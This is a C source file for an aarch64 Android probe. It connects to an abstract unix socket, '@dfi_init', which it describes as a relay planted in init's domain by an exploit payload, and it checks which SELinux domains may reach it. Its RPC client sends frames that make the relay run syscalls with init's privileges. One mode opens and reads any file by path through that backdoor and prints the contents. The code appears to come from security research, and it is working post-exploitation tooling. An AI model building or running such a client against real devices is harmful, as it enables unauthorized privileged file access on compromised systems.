/*
 * probe.c — Open Crown broker probe (A52 / pagecache-relay)
 *
 * Purpose: determine whether a given SELinux domain can open a usable
 * control channel to the init-domain relay that listens on the abstract
 * unix socket "@dfi_init".
 *
 * This client only *connects* and issues a tiny, read-only RPC. It does not
 * patch anything, does not load shellcode, and does not escalate privilege
 * by itself. It exists to measure the kernel/SELinux answer (errno) per domain.
 *
 * Wire format (derived from the payload disassembly; see README.md):
 *   request  : 4096 bytes, little-endian
 *     0x00 u64  syscall number
 *     0x08 u64  arg0
 *     0x10 u64  arg1
 *     0x18 u64  arg2
 *     0x20 u64  arg3
 *     0x28 u64  arg4
 *     0x30 u64  arg5
 *     0x38 u32  flags: bit N => argN is an offset into the buffer below
 *     0x3c u32  unused
 *     0x40 ...  4096-0x40 bytes of payload/string scratch
 *   response : 4096 bytes
 *     0x00 u64  raw syscall return (negative value == -errno)
 *     0x3c u8   constant marker written by the relay (0xd1)
 *
 * Build: ./build.sh   (static aarch64 via the NDK)
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

#define REQ_LEN 4096u
#define BUF_OFF 0x40u

#define AARCH64_NR_OPENAT 56u
#define AARCH64_NR_CLOSE  57u
#define AARCH64_NR_READ   63u
#define AARCH64_NR_GETUID 174u

static const char *errno_name(int e)
{
    switch (e) {
    case 0:            return "OK";
    case EACCES:       return "EACCES";
    case EPERM:        return "EPERM";
    case ECONNREFUSED: return "ECONNREFUSED";
    case ENOENT:       return "ENOENT";
    case EADDRINUSE:   return "EADDRINUSE";
    case ETIMEDOUT:    return "ETIMEDOUT";
    case EPROTOTYPE:   return "EPROTOTYPE";
    default:           return "OTHER";
    }
}

/* Read our own SELinux context straight from the kernel, no dependencies. */
static void print_context(void)
{
    char buf[256];
    int fd = open("/proc/self/attr/current", O_RDONLY);
    ssize_t n = -1;
    if (fd >= 0) {
        n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
    }
    if (n > 0) {
        buf[n] = '\0';
        printf("selinux_context=%s\n", buf);
    } else {
        printf("selinux_context=<unreadable errno=%d(%s)>\n", errno, errno_name(errno));
    }
    printf("uid=%ld euid=%ld pid=%ld\n", (long)getuid(), (long)geteuid(), (long)getpid());
}

static int connect_relay(const char *name, int timeout_ms, int *out_errno)
{
    struct sockaddr_un sa;
    int fd, rc;
    socklen_t len;

    memset(&sa, 0, sizeof(sa));
    sa.sun_family = AF_UNIX;
    /* Abstract namespace: sun_path[0] == 0, name follows. */
    sa.sun_path[0] = '\0';
    memcpy(sa.sun_path + 1, name, strlen(name));
    len = (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1 + strlen(name));

    fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) {
        *out_errno = errno;
        return -1;
    }

    {
        int fl = fcntl(fd, F_GETFL, 0);
        fcntl(fd, F_SETFL, fl | O_NONBLOCK);
    }

    rc = connect(fd, (struct sockaddr *)&sa, len);
    if (rc < 0 && errno == EINPROGRESS) {
        struct pollfd p = { .fd = fd, .events = POLLOUT };
        rc = poll(&p, 1, timeout_ms);
        if (rc == 0) {
            *out_errno = ETIMEDOUT;
            close(fd);
            return -1;
        }
        if (rc < 0) {
            *out_errno = errno;
            close(fd);
            return -1;
        }
        {
            int soerr = 0;
            socklen_t sl = sizeof(soerr);
            if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &soerr, &sl) < 0) {
                *out_errno = errno;
                close(fd);
                return -1;
            }
            if (soerr != 0) {
                *out_errno = soerr;
                close(fd);
                return -1;
            }
        }
    } else if (rc < 0) {
        *out_errno = errno;
        close(fd);
        return -1;
    }

    {
        int fl = fcntl(fd, F_GETFL, 0);
        fcntl(fd, F_SETFL, fl & ~O_NONBLOCK);
    }
    *out_errno = 0;
    return fd;
}

static void put_u64(uint8_t *p, size_t off, uint64_t v) { memcpy(p + off, &v, 8); }
static uint64_t get_u64(const uint8_t *p, size_t off)
{
    uint64_t v;
    memcpy(&v, p + off, 8);
    return v;
}

static int send_all(int fd, const uint8_t *p, size_t n)
{
    size_t done = 0;
    while (done < n) {
        ssize_t w = write(fd, p + done, n - done);
        if (w <= 0) {
            if (w < 0 && errno == EINTR) continue;
            return -1;
        }
        done += (size_t)w;
    }
    return 0;
}

static int recv_all(int fd, uint8_t *p, size_t n)
{
    size_t done = 0;
    while (done < n) {
        ssize_t r = read(fd, p + done, n - done);
        if (r <= 0) {
            if (r < 0 && errno == EINTR) continue;
            return -1;
        }
        done += (size_t)r;
    }
    return 0;
}

/* One RPC round trip. Returns the raw syscall return, or -1 on transport error. */
static int rpc(int fd, uint64_t nr, const uint64_t args[6], uint32_t flags,
               uint8_t *resp)
{
    uint8_t req[REQ_LEN];
    memset(req, 0, sizeof(req));
    put_u64(req, 0x00, nr);
    for (int i = 0; i < 6; i++)
        put_u64(req, (size_t)(0x08 + i * 8), args[i]);
    memcpy(req + 0x38, &flags, 4);

    if (send_all(fd, req, sizeof(req)) < 0) {
        fprintf(stderr, "send failed: errno=%d(%s)\n", errno, errno_name(errno));
        return -1;
    }
    if (recv_all(fd, resp, REQ_LEN) < 0) {
        fprintf(stderr, "recv failed: errno=%d(%s)\n", errno, errno_name(errno));
        return -1;
    }
    return 0;
}

/* Bind an abstract socket and wait for exactly one connection.
 * Used as a calibration target: it lets us measure what a *cross-domain*
 * abstract-socket connect returns on this kernel, independent of the relay. */
static int listen_once(const char *name, int timeout_ms)
{
    struct sockaddr_un sa;
    struct pollfd p;
    int fd, cfd;
    socklen_t len;

    memset(&sa, 0, sizeof(sa));
    sa.sun_family = AF_UNIX;
    sa.sun_path[0] = '\0';
    memcpy(sa.sun_path + 1, name, strlen(name));
    len = (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1 + strlen(name));

    fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) { printf("socket: errno=%d(%s)\n", errno, errno_name(errno)); return 1; }
    if (bind(fd, (struct sockaddr *)&sa, len) < 0) {
        printf("bind(@%s): errno=%d(%s)\n", name, errno, errno_name(errno));
        close(fd); return 1;
    }
    if (listen(fd, 4) < 0) {
        printf("listen: errno=%d(%s)\n", errno, errno_name(errno));
        close(fd); return 1;
    }
    printf("listening=@%s\n", name);
    fflush(stdout);

    p.fd = fd; p.events = POLLIN;
    if (poll(&p, 1, timeout_ms) <= 0) {
        printf("listen(@%s): no connection within %dms\n", name, timeout_ms);
        close(fd); return 2;
    }
    cfd = accept(fd, NULL, NULL);
    printf("listen(@%s): ACCEPTED (cross-domain connect allowed)\n", name);
    if (cfd >= 0) close(cfd);
    close(fd);
    return 0;
}

/* Ask the kernel for the peer's SELinux context. On a connected unix socket
 * this is the server's label, i.e. the tcontext an AVC denial would name. */
static void print_peercon(int fd)
{
    char buf[256];
    socklen_t len = sizeof(buf) - 1;
    memset(buf, 0, sizeof(buf));
    if (getsockopt(fd, SOL_SOCKET, 31 /* SO_PEERSEC */, buf, &len) == 0) {
        buf[len] = '\0';
        printf("peer_selinux_context=%s\n", buf);
    } else {
        printf("peer_selinux_context=<unavailable errno=%d(%s)>\n", errno, errno_name(errno));
    }
}

static void report_result(const uint8_t *resp, const char *what)
{
    int64_t raw = (int64_t)get_u64(resp, 0x00);
    printf("%s: raw=%lld frame_marker=0x%02x\n", what, (long long)raw,
           resp[0x3c]);
    if (raw < 0)
        printf("%s: errno=%lld(%s)  [relay ran the syscall and the kernel refused]\n",
               what, (long long)(-raw), strerror((int)(-raw)));
}

int main(int argc, char **argv)
{
    const char *mode = (argc > 1) ? argv[1] : "connect";
    const char *sock = "dfi_init";
    const char *path = NULL;
    int timeout_ms = 3000;

    /* readfile takes the path first; every other mode takes the socket name. */
    if (strcmp(mode, "readfile") == 0) {
        path = (argc > 2) ? argv[2] : NULL;
        if (argc > 3 && argv[3][0]) sock = argv[3];
    } else if (argc > 2 && argv[2][0]) {
        sock = argv[2];
    }
    int e = 0, fd;
    uint8_t resp[REQ_LEN];

    printf("mode=%s sock=@%s\n", mode, sock);
    print_context();
    fflush(stdout);

    if (strcmp(mode, "listen") == 0) {
        int rc = listen_once(sock, 15000);
        return rc;
    }

    fd = connect_relay(sock, timeout_ms, &e);
    if (fd < 0) {
        printf("connect(@%s): FAILED errno=%d(%s)\n", sock, e, errno_name(e));
        if (e == ECONNREFUSED)
            printf("verdict: NO RELAY LISTENING (socket absent or not bound)\n");
        else if (e == EACCES || e == EPERM)
            printf("verdict: DENIED BY POLICY (socket exists; connect refused by LSM)\n");
        else
            printf("verdict: CONNECT FAILED for another reason\n");
        return (e == EACCES || e == EPERM) ? 2 : 3;
    }

    printf("connect(@%s): OK\n", sock);
    print_peercon(fd);

    if (strcmp(mode, "connect") == 0) {
        close(fd);
        return 0;
    }

    if (strcmp(mode, "getuid") == 0) {
        uint64_t args[6] = { 0, 0, 0, 0, 0, 0 };
        if (rpc(fd, AARCH64_NR_GETUID, args, 0, resp) < 0) { close(fd); return 4; }
        report_result(resp, "getuid");
        close(fd);
        return 0;
    }

    if (strcmp(mode, "readfile") == 0 && path != NULL) {
        int64_t fdv;
        uint8_t reqbuf[REQ_LEN];

        if (strlen(path) + 1 > REQ_LEN - BUF_OFF) {
            fprintf(stderr, "path too long\n");
            close(fd);
            return 5;
        }
        memset(reqbuf, 0, sizeof(reqbuf));
        put_u64(reqbuf, 0x00, AARCH64_NR_OPENAT);
        put_u64(reqbuf, 0x08, (uint64_t)-100);     /* AT_FDCWD */
        put_u64(reqbuf, 0x10, 0);                   /* path at buffer offset 0 */
        put_u64(reqbuf, 0x18, O_RDONLY);
        {
            uint32_t flags = 0x2;                   /* arg1 is a buffer offset */
            memcpy(reqbuf + 0x38, &flags, 4);
        }
        memcpy(reqbuf + BUF_OFF, path, strlen(path) + 1);

        if (send_all(fd, reqbuf, REQ_LEN) < 0 || recv_all(fd, resp, REQ_LEN) < 0) {
            close(fd);
            return 4;
        }
        fdv = (int64_t)get_u64(resp, 0x00);
        report_result(resp, "openat");
        if (fdv < 0) { close(fd); return 0; }

        memset(reqbuf, 0, sizeof(reqbuf));
        put_u64(reqbuf, 0x00, AARCH64_NR_READ);
        put_u64(reqbuf, 0x08, (uint64_t)fdv);
        put_u64(reqbuf, 0x10, 0);                   /* read into buffer offset 0 */
        put_u64(reqbuf, 0x18, 512);
        {
            uint32_t flags = 0x2;
            memcpy(reqbuf + 0x38, &flags, 4);
        }
        if (send_all(fd, reqbuf, REQ_LEN) < 0 || recv_all(fd, resp, REQ_LEN) < 0) {
            close(fd);
            return 4;
        }
        {
            int64_t n = (int64_t)get_u64(resp, 0x00);
            report_result(resp, "read");
            if (n > 0) {
                printf("---- first %lld bytes of %s ----\n", (long long)n, path);
                fwrite(resp + BUF_OFF, 1, (size_t)(n > 200 ? 200 : n), stdout);
                printf("\n---- end ----\n");
            }
        }
        close(fd);
        return 0;
    }

    fprintf(stderr, "unknown mode '%s' (use: connect [sock] | getuid [sock] | readfile <path> [sock] | listen <sock>)\n", mode);
    close(fd);
    return 5;
}